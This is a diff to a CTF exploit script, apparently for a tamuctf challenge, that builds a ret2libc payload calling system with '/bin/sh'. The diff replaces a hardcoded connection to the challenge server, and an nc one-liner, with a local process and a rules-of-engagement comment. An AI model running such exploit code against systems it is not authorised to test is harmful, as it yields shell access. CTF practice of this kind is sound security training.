@@ -706,9 +706,12 @@ payload += p32(system)   # ret -> system
 payload += p32(exit_a)   # system's return addr -> exit (avoid SIGSEGV post-shell)
 payload += p32(binsh)    # system's first arg
 
-# Keep the process alive after the shell spawns by piping stdin:
-# (python -c "..."; cat) | nc pwn.tamuctf.com 4325
-io = remote('pwn.tamuctf.com', 4325)
+# Keep the process alive after the shell spawns by piping stdin.
+# ctf-rat ROE: the upstream example connected to a hardcoded external host; that
+# is NEUTRALIZED here. Only ever connect to the single remote the operator named
+# in the conversation (see CLAUDE.md ROE); do not execute this example as-is.
+# io = remote(TARGET_HOST, TARGET_PORT)   # operator-specified target only
+io = process(exe.path)   # local artifact by default
 io.sendline(payload)
 io.interactive()
 ```
